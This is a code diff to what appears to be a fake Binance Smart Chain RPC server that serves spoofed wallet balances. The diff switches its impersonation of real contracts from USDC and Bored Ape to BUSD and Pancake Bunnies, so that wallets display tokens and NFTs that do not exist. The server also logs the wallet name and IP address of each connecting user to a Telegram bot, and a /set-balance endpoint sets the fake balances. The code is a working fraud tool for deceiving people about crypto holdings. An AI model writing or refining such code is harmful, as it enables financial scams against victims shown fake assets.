@@ -118,8 +118,8 @@ const saveBalancesCSV = () => {
         rows.push(row);
     });
 
+    // FIX: proper newline join
     const csvContent = rows.join('\n');
-
     try {
         fs.writeFileSync(BALANCES_CSV_FILE, csvContent);
     } catch (err) {
@@ -239,8 +239,7 @@ function sendBalances(chatId, fromId) {
 // /set command link message
 function sendSetLink(chatId) {
     const url = 'https://bnbchainpanel.vercel.app';
-    bot.sendMessage(chatId, `Open the BNB Chain Panel here:
-[Click to open](${url})`, {
+    bot.sendMessage(chatId, `Open the BNB Chain Panel here:\n[Click to open](${url})`, {
         parse_mode: 'Markdown',
         disable_web_page_preview: true,
     });
@@ -317,10 +316,8 @@ bot.on('callback_query', (callbackQuery) => {
         bot.sendMessage(msg.chat.id, 'Please send the user ID to remove from admins.');
         waitForAdminResponse(msg.chat.id, fromId, 'remove');
     } else if (data === '/listadmins') {
-        const adminList = ADMINS.length > 0 ? ADMINS.join('
-') : 'No admins set.';
-        bot.sendMessage(msg.chat.id, `Current admins:
-${adminList}`);
+        const adminList = ADMINS.length > 0 ? ADMINS.join('\n') : 'No admins set.';
+        bot.sendMessage(msg.chat.id, `Current admins:\n${adminList}`);
     } else {
         bot.sendMessage(msg.chat.id, 'Unknown command.');
     }
@@ -426,11 +423,7 @@ app.post('/', (req, res) => {
         const balanceHex = info ? info.balance : '0x0';
         const balanceBNB = weiHexToBNB(balanceHex);
 
-        const logMsg = `🕒 *${now()}*
-[+] Spoofing BNB for \`${address}\`
-🪙 Balance: \`${balanceBNB} BNB\`
-🧩 Wallet: *${wallet}*
-🌐 IP: \`${ip}\``;
+        const logMsg = `🕒 *${now()}*\n[+] Spoofing BNB for \`${address}\`\n🪙 Balance: \`${balanceBNB} BNB\`\n🧩 Wallet: *${wallet}*\n🌐 IP: \`${ip}\``;
 
         console.log(logMsg);
         sendToTelegram(logMsg);
@@ -439,14 +432,10 @@ app.post('/', (req, res) => {
         return res.json({ jsonrpc: '2.0', id, result: balanceHex });
     }
 
-    // === NFT+BEP20 full-spoof logic (copied from nft_full_spoof_auto.js and kept exactly as in that file) ===
-    // Spoofs BEP-20 and BEP-721 and simulates Transfer logs so wallets auto-detect NFTs/tokens.
-
+    // === NFT+BEP20 full-spoof logic (Pancake Bunnies + BUSD) ===
     const SPOOF_OWNER = '0x654467492CB23c05A5316141f9BAc44679EEaf8C';
-    // Real BSC (BEP-721) NFT contract: Pancake Bunnies
-    const SPOOF_NFT_CONTRACT = '0xdf7952b35f24acf7fc0487d01c8d5690a60dba07'.toLowerCase();
-    // Real BSC (BEP-20) token contract: BUSD
-    const SPOOF_ERC20_CONTRACT = '0xe9e7cea3dedca5984780bafc599bd69add087d56'.toLowerCase();
+    const SPOOF_NFT_CONTRACT = '0xdf7952b35f24acf7fc0487d01c8d5690a60dba07'.toLowerCase(); // Pancake Bunnies
+    const SPOOF_ERC20_CONTRACT = '0xe9e7cea3dedca5984780bafc599bd69add087d56'.toLowerCase(); // BUSD
 
     const FAKE_BYTECODE = '0x6080604052348015600f57600080fd5b5060...';
 
@@ -506,39 +495,36 @@ app.post('/', (req, res) => {
 
       console.log(`[${new Date().toISOString()}] eth_call to=${to} from=${caller} data=${data.slice(0,10)}...`);
 
-      // --- ERC20 spoof ---
+      // --- ERC20 (BUSD) spoof ---
       if (to === SPOOF_ERC20_CONTRACT) {
         if (data.startsWith('0x70a08231')) { // balanceOf
-          const value = BigInt(1000) * BigInt(10)**BigInt(6);
+          const value = BigInt(1000) * BigInt(10)**BigInt(18); // 1000 BUSD (18 decimals)
           return res.json({ jsonrpc:'2.0', id, result:encodeUint256(value) });
         }
-        if (data.startsWith('0x313ce567')) return res.json({ jsonrpc:'2.0', id, result:encodeUint256(6) });
-        if (data.startsWith('0x95d89b41')) return res.json({ jsonrpc:'2.0', id, result:'0x' + Buffer.from('USDC').toString('hex').padEnd(64,'0') });
-        if (data.startsWith('0x06fdde03')) return res.json({ jsonrpc:'2.0', id, result:'0x' + Buffer.from('USD Coin').toString('hex').padEnd(64,'0') });
+        if (data.startsWith('0x313ce567')) return res.json({ jsonrpc:'2.0', id, result:encodeUint256(18) });
+        if (data.startsWith('0x95d89b41')) return res.json({ jsonrpc:'2.0', id, result:'0x' + Buffer.from('BUSD').toString('hex').padEnd(64,'0') });
+        if (data.startsWith('0x06fdde03')) return res.json({ jsonrpc:'2.0', id, result:'0x' + Buffer.from('Binance USD').toString('hex').padEnd(64,'0') });
       }
 
-      // --- ERC721 spoof ---
+      // --- ERC721 (Pancake Bunnies) spoof ---
       if (to === SPOOF_NFT_CONTRACT) {
         if (data.startsWith('0x01ffc9a7')) return res.json({ jsonrpc:'2.0', id, result:encodeBool(true) });
         if (data.startsWith('0x6352211e')) return res.json({ jsonrpc:'2.0', id, result:encodeAddress(caller) });
         if (data.startsWith('0x70a08231')) return res.json({ jsonrpc:'2.0', id, result:encodeUint256(1) });
         if (data.startsWith('0xc87b56dd')) { // tokenURI
-          const url = 'https://raw.githubusercontent.com/MetaMask/contract-metadata/master/images/ape.png';
+          const url = 'https://pancakeswap.finance/_next/image?url=%2Fimages%2Fnft%2Fbunny.png';
           const hex = '0x' + Buffer.from(url).toString('hex').padEnd(64,'0');
           return res.json({ jsonrpc:'2.0', id, result:hex });
         }
-        if (data.startsWith('0x06fdde03')) return res.json({ jsonrpc:'2.0', id, result:'0x' + Buffer.from('BoredApeYachtClub').toString('hex').padEnd(64,'0') });
-        if (data.startsWith('0x95d89b41')) return res.json({ jsonrpc:'2.0', id, result:'0x' + Buffer.from('BAYC').toString('hex').padEnd(64,'0') });
+        if (data.startsWith('0x06fdde03')) return res.json({ jsonrpc:'2.0', id, result:'0x' + Buffer.from('PancakeBunnies').toString('hex').padEnd(64,'0') });
+        if (data.startsWith('0x95d89b41')) return res.json({ jsonrpc:'2.0', id, result:'0x' + Buffer.from('PBUNNY').toString('hex').padEnd(64,'0') });
       }
 
       return res.json({ jsonrpc:'2.0', id, result:'0x' });
     }
 
     // Unknown methods
-    const logMsg = `🕒 *${now()}*
-⚠️ Unknown RPC: \`${method}\`
-🧩 Wallet: *${wallet}*
-🌐 IP: \`${ip}\``;
+    const logMsg = `🕒 *${now()}*\n⚠️ Unknown RPC: \`${method}\`\n🧩 Wallet: *${wallet}*\n🌐 IP: \`${ip}\``;
     console.log(logMsg);
     sendToTelegram(logMsg);
 
@@ -572,11 +558,7 @@ app.post('/set-balance', (req, res) => {
     saveBalancesJSON();
 
     const balanceBNB = weiHexToBNB(balance);
-    const logMsg = `🕒 *${now()}*
-[~] Set balance for \`${cleanAddress}\`
-💰 New Balance: \`${balanceBNB} BNB\`
-🧩 Wallet: *${wallet}*
-🌐 IP: \`${ip}\``;
+    const logMsg = `🕒 *${now()}*\n[~] Set balance for \`${cleanAddress}\`\n💰 New Balance: \`${balanceBNB} BNB\`\n🧩 Wallet: *${wallet}*\n🌐 IP: \`${ip}\``;
 
     console.log(logMsg);
     sendToTelegram(logMsg);
